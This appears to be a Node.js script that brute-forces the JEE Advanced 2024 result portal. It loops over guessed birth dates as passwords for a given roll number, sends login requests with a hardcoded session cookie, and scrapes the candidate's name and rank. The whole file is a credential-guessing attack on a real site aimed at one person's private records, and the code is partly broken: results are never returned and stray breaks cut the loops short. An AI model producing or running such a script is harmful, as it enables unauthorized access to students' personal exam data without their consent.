const axios = require('axios');
const qs = require('qs');
const cheerio =require('cheerio')





async function solve(appNum,day,month,year){

  let data = qs.stringify({
    'username': appNum,
    'password': day + '-' + month + '-'+ year
  });
  
  console.log(data)


  let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'https://jeeadv.iitm.ac.in/result24/index.php',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.5',
      'Accept-Encoding': 'gzip, deflate, br, zstd',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Origin': 'https://jeeadv.iitm.ac.in',
      'Connection': 'keep-alive',
      'Referer': 'https://jeeadv.iitm.ac.in/result24/index.php',
      'Cookie': 'PHPSESSID=ru5ulpjsljipuprhruvjflt6a4',
      'Upgrade-Insecure-Requests': '1',
      'Sec-Fetch-Dest': 'document',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-User': '?1',
      'Priority': 'u=1'
    },
    data: data
  };


  
  await axios.request(config)
  .then((response) => {
      // console.log(response.data)
      const parsedData = parsehtml(JSON.stringify(response.data))
      return parsedData;
      
    })
    .catch((error) => {
      console.log("fuck");
    });

}
function parsehtml(htmlcontent){
  const $ = cheerio.load(htmlcontent);
  const applicationNum = $('td:contains("JEE(Adv) 2024 RollNo")').text().trim()||'N/A';
  const candidateName = $('td:contains("Candidate Name")').next('td').text().trim()||'N/A';
  const allIndiaRank = $('td:contains("CRL")').next('td').text().trim()||'N/A';
  
  if (allIndiaRank ==='N/A'){
    return null;
  }
  return {
    applicationNum,
    candidateName,
    allIndiaRank,
  }

}



async function main(RollNo){
  for (let year=2006; year>=2004;year--){
    for(let month=9;month<=12;month++){
      for (let day=24;day<=31;day++){
        date = {year:year.toString(),month:month>9?month.toString():'0'+month.toString(),day:(day>9 ? '':'0')+day.toString()}
        console.log(`Processing the data for ${RollNo} for ${date.year}-${date.month}-${date.day}`)
        // console.log(date)
        
        const data = await solve(RollNo,date.day,date.month,date.year);
        console.log(data.allIndiaRank)
        break;
        if (data){
          console.log(data);
          process.exit(1)
        }
        
      }
      break;
    }
    break
  }
}

main("242042064")

